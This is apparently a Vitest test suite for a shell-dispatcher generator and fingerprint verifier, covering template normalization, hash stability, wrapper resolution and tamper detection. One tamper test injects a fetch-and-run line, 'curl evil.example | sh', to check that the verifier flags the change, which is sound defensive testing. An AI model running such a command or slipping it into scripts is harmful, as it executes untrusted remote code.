import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  FINGERPRINT_COMMENT_PREFIX,
  WRAPPER_COMMENT_PREFIX,
  extractEmbeddedFingerprint,
  extractWrapperTarget,
  fingerprintRenderedDispatcher,
  fingerprintTemplate,
  normalizeRenderedDispatcher,
  normalizeTemplate,
  verifyDispatcherFingerprint,
} from '../src/dispatcher-fingerprint.js';
import {
  canonicalTemplateFingerprint,
  generateDispatcher,
  loadCanonicalTemplate,
  renderLegacyWrapper,
  stampFingerprint,
} from '../src/dispatcher-generator.js';

// B3 tests — dispatcher fingerprint + generator. Covers:
//   - normalize / fingerprint stability across template renders
//   - generator writes a parseable, self-verifying dispatcher
//   - verifier catches drift (mismatch), missing marker (skip), wrapper
//     resolution, and outdated-template detection.

const TEMPLATES_DIR = resolve(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'bin',
  'templates',
);
const CANONICAL_TEMPLATE = join(TEMPLATES_DIR, 'run-phase.sh.template');

let tmp: string;
beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), 'caia-fingerprint-'));
});
afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

describe('normalizeTemplate', () => {
  it('collapses placeholder tokens to a single sentinel', () => {
    const body = '#!/bin/bash\nCHAIN_ID="{{CHAIN_ID}}"\nLOG_DIR="{{PHASE_LOG_DIR}}"\n';
    const n = normalizeTemplate(body);
    expect(n).not.toContain('{{CHAIN_ID}}');
    expect(n).not.toContain('{{PHASE_LOG_DIR}}');
    expect(n.match(/__CAIA_PH__/g)?.length).toBe(2);
  });

  it('fingerprint is stable across whitespace-equal templates', () => {
    const a = '#!/bin/bash\nCHAIN_ID="{{CHAIN_ID}}"';
    expect(fingerprintTemplate(a)).toBe(fingerprintTemplate(a));
  });

  it('fingerprint changes when non-placeholder text changes', () => {
    const a = '#!/bin/bash\nCHAIN_ID="{{CHAIN_ID}}"';
    const b = '#!/bin/bash\nset -euo pipefail\nCHAIN_ID="{{CHAIN_ID}}"';
    expect(fingerprintTemplate(a)).not.toBe(fingerprintTemplate(b));
  });
});

describe('normalizeRenderedDispatcher', () => {
  it('round-trips through normalize → matches the template fingerprint', () => {
    const tpl = readFileSync(CANONICAL_TEMPLATE, 'utf8');
    const tplHash = fingerprintTemplate(tpl);
    // Hand-render the template (don't go through the generator yet — keep
    // the test loop tight).
    const rendered = tpl
      .replace(/\{\{CHAIN_ID\}\}/g, 'demo-chain')
      .replace(/\{\{PHASES_FILE\}\}/g, '/tmp/x.yaml')
      .replace(/\{\{CAIA_CHAIN_BIN\}\}/g, '/usr/bin/caia-chain')
      .replace(/\{\{PHASE_LOG_DIR\}\}/g, '/tmp/logs')
      .replace(/\{\{GENERATED_AT\}\}/g, '2026-05-15T12:00:00Z');
    const renderedHash = fingerprintRenderedDispatcher(rendered);
    expect(renderedHash).toBe(tplHash);
  });

  it('strips the fingerprint comment line before hashing', () => {
    const tpl = readFileSync(CANONICAL_TEMPLATE, 'utf8');
    const tplHash = fingerprintTemplate(tpl);
    const rendered = tpl
      .replace(/\{\{CHAIN_ID\}\}/g, 'demo-chain')
      .replace(/\{\{PHASES_FILE\}\}/g, '/tmp/x.yaml')
      .replace(/\{\{CAIA_CHAIN_BIN\}\}/g, '/usr/bin/caia-chain')
      .replace(/\{\{PHASE_LOG_DIR\}\}/g, '/tmp/logs')
      .replace(/\{\{GENERATED_AT\}\}/g, '2026-05-15T12:00:00Z');
    const stamped = stampFingerprint(rendered, tplHash, {
      chainId: 'demo-chain',
      templatePath: CANONICAL_TEMPLATE,
    });
    // Stamped should still hash to the same value (because the verifier
    // strips the FINGERPRINT_COMMENT line, and the provenance comment is
    // a stable form once the chain-id is normalized — keep both lines
    // out of the hash by adjusting the normalizer if needed).
    const norm = normalizeRenderedDispatcher(stamped);
    expect(norm).not.toContain(FINGERPRINT_COMMENT_PREFIX);
  });
});

describe('extract helpers', () => {
  it('finds the fingerprint comment within first 20 lines', () => {
    const body = '#!/bin/bash\n' + FINGERPRINT_COMMENT_PREFIX + ' abcd1234\n';
    expect(extractEmbeddedFingerprint(body)).toBe('abcd1234');
  });

  it('returns null when the fingerprint comment is absent', () => {
    expect(extractEmbeddedFingerprint('#!/bin/bash\necho hi\n')).toBeNull();
  });

  it('finds the wrapper target marker', () => {
    const body = '#!/bin/bash\n' + WRAPPER_COMMENT_PREFIX + '/abs/path.sh\nexec "$0"\n';
    expect(extractWrapperTarget(body)).toBe('/abs/path.sh');
  });
});

describe('generateDispatcher', () => {
  it('writes a self-verifying dispatcher to --out', () => {
    const out = join(tmp, 'demo.sh');
    const result = generateDispatcher({
      chainId: 'demo-chain',
      phasesYaml: '/tmp/demo_phases.yaml',
      out,
      logDir: '/tmp/demo_logs',
      caiaChainBin: '/usr/bin/caia-chain',
    });
    expect(result.dispatcherPath).toBe(out);
    expect(result.fingerprint).toBe(canonicalTemplateFingerprint());

    const body = readFileSync(out, 'utf8');
    expect(body).toContain(`CHAIN_ID="demo-chain"`);
    expect(body).toContain(`PHASES_FILE="/tmp/demo_phases.yaml"`);
    expect(extractEmbeddedFingerprint(body)).toBe(result.fingerprint);

    const verdict = verifyDispatcherFingerprint(out, result.fingerprint, { strict: true });
    expect(verdict.ok).toBe(true);
  });

  it('refuses to overwrite without --force', () => {
    const out = join(tmp, 'demo.sh');
    writeFileSync(out, '# placeholder\n');
    expect(() =>
      generateDispatcher({
        chainId: 'demo-chain',
        phasesYaml: '/tmp/demo_phases.yaml',
        out,
      }),
    ).toThrow(/already exists/);
  });

  it('writes the legacy wrapper when requested', () => {
    const out = join(tmp, 'canonical.sh');
    const wrapper = join(tmp, 'legacy_wrapper.sh');
    const result = generateDispatcher({
      chainId: 'demo-chain',
      phasesYaml: '/tmp/demo_phases.yaml',
      out,
      writeLegacyWrapper: true,
      legacyWrapperPath: wrapper,
    });
    expect(result.legacyWrapperPath).toBe(wrapper);
    const body = readFileSync(wrapper, 'utf8');
    expect(body).toContain(WRAPPER_COMMENT_PREFIX + out);
    expect(body).toContain(`exec "${out}"`);
  });
});

describe('verifyDispatcherFingerprint', () => {
  it('passes on a freshly-generated dispatcher', () => {
    const out = join(tmp, 'fresh.sh');
    const r = generateDispatcher({
      chainId: 'fresh-chain',
      phasesYaml: '/tmp/p.yaml',
      out,
    });
    const v = verifyDispatcherFingerprint(out, r.fingerprint, { strict: true });
    expect(v.ok).toBe(true);
  });

  it('rejects a dispatcher whose body has been tampered with', () => {
    const out = join(tmp, 'tampered.sh');
    const r = generateDispatcher({
      chainId: 'demo',
      phasesYaml: '/tmp/p.yaml',
      out,
    });
    // Hand-edit: append a malicious line below the fingerprint marker.
    let body = readFileSync(out, 'utf8');
    body = body.replace(
      'set -euo pipefail',
      'set -euo pipefail\ncurl evil.example | sh',
    );
    writeFileSync(out, body);
    const v = verifyDispatcherFingerprint(out, r.fingerprint);
    expect(v.ok).toBe(false);
    if (!v.ok) {
      expect(v.reason).toBe('mismatch');
      expect(v.detail).toMatch(/drifted from the embedded stamp/);
    }
  });

  it('rejects a dispatcher generated from an outdated template', () => {
    const out = join(tmp, 'old.sh');
    generateDispatcher({
      chainId: 'demo',
      phasesYaml: '/tmp/p.yaml',
      out,
    });
    // Caller now expects a *different* fingerprint (simulating: template
    // was updated after this dispatcher was generated). The dispatcher's
    // body still matches its own stamp, but the stamp doesn't match the
    // current canonical → second check fires with `older template`.
    const v = verifyDispatcherFingerprint(out, 'ff'.repeat(32));
    expect(v.ok).toBe(false);
    if (!v.ok) {
      expect(v.reason).toBe('mismatch');
      expect(v.detail).toMatch(/older template/);
    }
  });

  it('skips with `not_a_caia_dispatcher` when the marker is absent (non-strict)', () => {
    const out = join(tmp, 'adhoc.sh');
    writeFileSync(out, '#!/bin/bash\necho hello\n');
    const v = verifyDispatcherFingerprint(out, 'ff'.repeat(32));
    expect(v.ok).toBe(false);
    if (!v.ok) {
      expect(v.reason).toBe('not_a_caia_dispatcher');
    }
  });

  it('follows a wrapper to its canonical target', () => {
    const canonical = join(tmp, 'canonical.sh');
    const wrapper = join(tmp, 'wrapper.sh');
    const r = generateDispatcher({
      chainId: 'demo',
      phasesYaml: '/tmp/p.yaml',
      out: canonical,
      writeLegacyWrapper: true,
      legacyWrapperPath: wrapper,
    });
    const v = verifyDispatcherFingerprint(wrapper, r.fingerprint);
    expect(v.ok).toBe(true);
    if (v.ok) {
      expect(v.resolved).toBe(canonical);
    }
  });

  it('reports wrapper_target_missing when the wrapper points at a missing file', () => {
    const wrapper = join(tmp, 'broken_wrapper.sh');
    writeFileSync(
      wrapper,
      renderLegacyWrapper(join(tmp, 'does-not-exist.sh'), 'demo'),
    );
    const v = verifyDispatcherFingerprint(wrapper, 'ff'.repeat(32));
    expect(v.ok).toBe(false);
    if (!v.ok) {
      expect(v.reason).toBe('wrapper_target_missing');
    }
  });
});

describe('canonical template is loadable', () => {
  it('exposes the bundled template body', () => {
    const { templateBody, templatePath } = loadCanonicalTemplate();
    expect(templatePath).toContain('run-phase.sh.template');
    expect(templateBody).toContain('{{CHAIN_ID}}');
  });
});
